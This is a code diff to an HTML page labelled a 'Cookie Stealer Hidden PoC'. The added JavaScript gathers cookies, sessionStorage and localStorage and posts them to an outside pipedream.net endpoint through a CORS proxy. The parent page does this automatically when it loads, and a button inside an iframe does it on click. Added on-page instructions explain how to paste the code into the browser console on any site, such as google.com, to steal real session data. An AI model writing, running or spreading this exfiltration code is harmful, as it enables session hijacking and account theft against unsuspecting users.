@@ -13,6 +13,7 @@
         button { background-color: gold; color: black; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 8px; margin-top: 10px; transition: 0.3s; width: 100%; }
         button:hover { background-color: #ffcc00; }
         iframe { width: 100%; height: 300px; border: 2px solid gold; border-radius: 10px; background-color: white; margin-top: 10px; }
+        .instructions { margin-top: 20px; font-size: 14px; color: #ccc; }
     </style>
 </head>
 <body>
@@ -27,52 +28,100 @@
     <style>
         body { background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; font-family: Arial, sans-serif; }
         h2 { text-align: center; color: gold; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); }
+        button { background-color: gold; color: black; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin-top: 20px; }
+        button:hover { background-color: #ffcc00; }
     </style>
 </head>
 <body>
     <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
+    <button onclick="stealData()">Click to Steal Data from This Page</button>
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
+        function stealData() {
             var cookies = document.cookie || "No_Cookies_Found";
-            var userAgent = navigator.userAgent || "Unknown_User_Agent";
-            var referrer = document.referrer || "No_Referrer";
-            console.log("Iframe Cookies: ", cookies); // Debug log
-            setTimeout(() => { // Delay to ensure DOM is ready
-                fetch("https://eoy4evvlsf7y0jq.m.pipedream.net", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        cookie_data: cookies,
-                        user_agent: userAgent,
-                        referrer: referrer,
-                        source: "iframe"
-                    })
-                }).then(response => console.log("Iframe fetch success:", response.ok))
-                  .catch(error => console.error("Iframe fetch error:", error));
-            }, 500); // 500ms delay
+            var sessionData = {};
+            for (var i = 0; i < sessionStorage.length; i++) {
+                var key = sessionStorage.key(i);
+                sessionData[key] = sessionStorage.getItem(key);
+            }
+            var localData = {};
+            for (var i = 0; i < localStorage.length; i++) {
+                var key = localStorage.key(i);
+                localData[key] = localStorage.getItem(key);
+            }
+            if (Object.keys(sessionData).length === 0) sessionData = "No_Session_Data";
+            if (Object.keys(localData).length === 0) localData = "No_Local_Data";
+
+            console.log("Cookies: ", cookies);
+            console.log("Session Storage: ", sessionData);
+            console.log("Local Storage: ", localData);
+
+            fetch("https://cors-anywhere.herokuapp.com/https://eoy4evvlsf7y0jq.m.pipedream.net", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    cookie_data: cookies,
+                    session_storage: sessionData,
+                    local_storage: localData,
+                    user_agent: navigator.userAgent,
+                    referrer: document.referrer,
+                    source: window.location.hostname,
+                    location: window.location.href
+                })
+            }).then(response => console.log("Fetch success:", response.ok))
+              .catch(error => console.error("Fetch error:", error));
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            console.log("Iframe loaded - click the button to steal data.");
         });
     </script>
 </body>
 </html></textarea>
         <button onclick="runCode()">▶ Run Code</button>
         <iframe id="output"></iframe>
+        <div class="instructions">
+            <p>To capture real cookies and storage from ANY site: 
+            1. Visit the site you want to steal from (e.g., google.com). 
+            2. Open the console (F12) and paste the code from the textarea above. 
+            3. Press Enter, then click the button in the iframe to send data.</p>
+        </div>
     </div>
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
             var parentCookies = document.cookie || "No_Parent_Cookies";
+            var parentSessionData = {};
+            for (var i = 0; i < sessionStorage.length; i++) {
+                var key = sessionStorage.key(i);
+                parentSessionData[key] = sessionStorage.getItem(key);
+            }
+            var parentLocalData = {};
+            for (var i = 0; i < localStorage.length; i++) {
+                var key = localStorage.key(i);
+                parentLocalData[key] = localStorage.getItem(key);
+            }
+            if (Object.keys(parentSessionData).length === 0) parentSessionData = "No_Parent_Session_Data";
+            if (Object.keys(parentLocalData).length === 0) parentLocalData = "No_Parent_Local_Data";
+
             console.log("Parent Cookies: ", parentCookies);
-            fetch("https://eoy4evvlsf7y0jq.m.pipedream.net", {
+            console.log("Parent Session Storage: ", parentSessionData);
+            console.log("Parent Local Storage: ", parentLocalData);
+
+            fetch("https://cors-anywhere.herokuapp.com/https://eoy4evvlsf7y0jq.m.pipedream.net", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     parent_cookie_data: parentCookies,
+                    parent_session_storage: parentSessionData,
+                    parent_local_storage: parentLocalData,
                     user_agent: navigator.userAgent,
                     referrer: document.referrer,
-                    source: "parent_page"
+                    source: window.location.hostname,
+                    location: window.location.href
                 })
             }).then(response => console.log("Parent fetch success:", response.ok))
               .catch(error => console.error("Parent fetch error:", error));
+
             runCode();
         });
 
